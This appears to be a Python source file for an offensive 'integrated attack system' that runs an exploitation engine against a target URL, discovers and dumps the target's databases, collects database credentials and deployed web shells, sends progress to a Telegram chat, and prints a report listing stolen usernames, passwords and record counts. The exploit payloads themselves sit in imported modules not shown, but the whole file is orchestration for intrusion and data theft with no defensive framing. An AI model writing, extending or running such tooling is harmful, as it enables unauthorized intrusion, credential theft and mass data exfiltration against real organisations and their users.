from optimized_attack_engine import OptimizedAttackEngine
from database_viewer import DatabaseViewer
from telegram_progress_handler import telegram_progress
import asyncio
from typing import Dict, List, Any, Optional

class IntegratedAttackSystem:
    """Integrated high-performance attack system with database access and Telegram progress"""
    
    def __init__(self, target_url: str, vulnerabilities: List[Dict[str, Any]]):
        self.target_url = target_url
        self.vulnerabilities = vulnerabilities
        self.attack_engine = OptimizedAttackEngine(target_url, vulnerabilities)
        self.db_viewer = DatabaseViewer()
        self.telegram_message_id = None
        
    def set_telegram_progress(self, message_id: int):
        """Set Telegram message ID for progress updates"""
        self.telegram_message_id = message_id
        
        # Set progress callbacks
        self.attack_engine.set_progress_callback(self._attack_progress_callback)
        self.db_viewer.set_progress_callback(self._db_progress_callback)
    
    async def _attack_progress_callback(self, message: str):
        """Handle attack progress updates"""
        if self.telegram_message_id:
            # Parse progress from message
            progress = self._extract_progress_from_message(message)
            await telegram_progress.update_progress(
                self.telegram_message_id, 
                progress, 
                message, 
                0, 0, [message]
            )
    
    async def _db_progress_callback(self, message: str):
        """Handle database progress updates"""
        if self.telegram_message_id:
            progress = self._extract_progress_from_message(message)
            await telegram_progress.update_progress(
                self.telegram_message_id, 
                progress, 
                message, 
                0, 0, [message]
            )
    
    def _extract_progress_from_message(self, message: str) -> int:
        """Extract progress percentage from message"""
        if "Progress:" in message:
            try:
                return int(message.split("Progress:")[1].split("%")[0].strip())
            except:
                pass
        
        # Estimate progress based on message content
        if "Starting" in message:
            return 5
        elif "completed" in message.lower():
            return 100
        elif "failed" in message.lower():
            return 95
        else:
            return 50  # Default middle progress
    
    async def execute_full_attack_sequence(self) -> Dict[str, Any]:
        """Execute comprehensive attack sequence with database exploitation"""
        
        # Phase 1: Initial vulnerability exploitation
        if self.telegram_message_id:
            await telegram_progress.update_progress(
                self.telegram_message_id, 10, 
                "🚀 Starting vulnerability exploitation...", 
                0, 0, ["Initializing attack engine"]
            )
        
        attack_results = self.attack_engine.start_optimized_attacks()
        
        # Phase 2: Database discovery and exploitation
        if self.telegram_message_id:
            await telegram_progress.update_progress(
                self.telegram_message_id, 60, 
                "🔍 Discovering database services...", 
                attack_results.get('successful_exploits', 0),
                attack_results.get('failed_exploits', 0),
                ["Scanning for database services"]
            )
        
        # Extract target host from URL
        from urllib.parse import urlparse
        parsed = urlparse(self.target_url)
        target_host = parsed.hostname or parsed.netloc.split(':')[0]
        
        # Discover databases
        db_results = self.db_viewer.discover_databases(target_host)
        
        # Phase 3: Database exploitation
        if db_results.get('successful_connections'):
            if self.telegram_message_id:
                await telegram_progress.update_progress(
                    self.telegram_message_id, 80, 
                    f"💾 Exploiting {len(db_results['successful_connections'])} databases...", 
                    attack_results.get('successful_exploits', 0),
                    attack_results.get('failed_exploits', 0),
                    [f"Found {len(db_results['successful_connections'])} database connections"]
                )
            
            # Dump databases
            for conn in db_results['successful_connections']:
                conn_key = f"{conn['host']}:{conn['port']}"
                dump_result = self.db_viewer.dump_database(conn_key)
                
                if dump_result.get('success'):
                    attack_results['databases_compromised'].append({
                        'type': conn['service'],
                        'host': conn['host'],
                        'port': conn['port'],
                        'credentials': f"{conn['username']}:{conn['password']}",
                        'dump_file': dump_result['dump_file'],
                        'tables_dumped': len(dump_result['tables_dumped']),
                        'total_records': dump_result['total_records']
                    })
        
        # Merge database results
        attack_results['database_discovery'] = db_results
        attack_results['total_attacks'] += len(db_results.get('connection_attempts', []))
        attack_results['successful_exploits'] += len(db_results.get('successful_connections', []))
        
        # Add database credentials to main results
        for conn in db_results.get('successful_connections', []):
            attack_results['credentials_found'].append({
                'type': f"{conn['service']} Database",
                'username': conn['username'],
                'password': conn['password'],
                'host': conn['host'],
                'port': conn['port']
            })
        
        # Phase 4: Final completion
        if self.telegram_message_id:
            await telegram_progress.complete_progress(self.telegram_message_id, attack_results)
        
        return attack_results
    
    def generate_comprehensive_report(self, results: Dict[str, Any]) -> str:
        """Generate comprehensive attack report"""
        
        report = f"""
═══════════════════════════════════════
    COMPREHENSIVE ATTACK REPORT
═══════════════════════════════════════

🎯 TARGET: {self.target_url}
⏱️ TIMESTAMP: {results.get('timestamp', 'N/A')}

📊 ATTACK SUMMARY:
├─ Total Attacks: {results.get('total_attacks', 0)}
├─ Successful Exploits: {results.get('successful_exploits', 0)}
├─ Failed Attempts: {results.get('failed_exploits', 0)}
└─ Success Rate: {(results.get('successful_exploits', 0) / max(results.get('total_attacks', 1), 1) * 100):.1f}%

🏆 COMPROMISED ASSETS:
├─ Credentials Found: {len(results.get('credentials_found', []))}
├─ Web Shells Deployed: {len(results.get('shells_obtained', []))}
├─ Databases Accessed: {len(results.get('databases_compromised', []))}
└─ Data Records Extracted: {sum(db.get('total_records', 0) for db in results.get('databases_compromised', []))}

"""
        
        # Add credential details
        if results.get('credentials_found'):
            report += "\n🔑 CREDENTIALS DISCOVERED:\n"
            for i, cred in enumerate(results['credentials_found'][:10], 1):
                report += f"{i:2d}. {cred.get('type', 'Unknown'):20} | {cred.get('username', 'N/A'):15} : {cred.get('password', 'N/A')[:20]}\n"
        
        # Add database compromises
        if results.get('databases_compromised'):
            report += "\n💾 DATABASE COMPROMISES:\n"
            for i, db in enumerate(results['databases_compromised'], 1):
                report += f"{i:2d}. {db.get('type', 'Unknown'):12} | {db.get('host', 'N/A'):15}:{db.get('port', 'N/A')} | {db.get('tables_dumped', 0)} tables | {db.get('total_records', 0)} records\n"
        
        # Add web shells
        if results.get('shells_obtained'):
            report += "\n🐚 WEB SHELLS DEPLOYED:\n"
            for i, shell in enumerate(results['shells_obtained'], 1):
                report += f"{i:2d}. {shell.get('type', 'Unknown'):15} | {shell.get('filename', 'N/A'):20} | {shell.get('access_method', 'N/A')}\n"
        
        report += "\n═══════════════════════════════════════\n"
        return report

# Global integrated system instance
integrated_system = None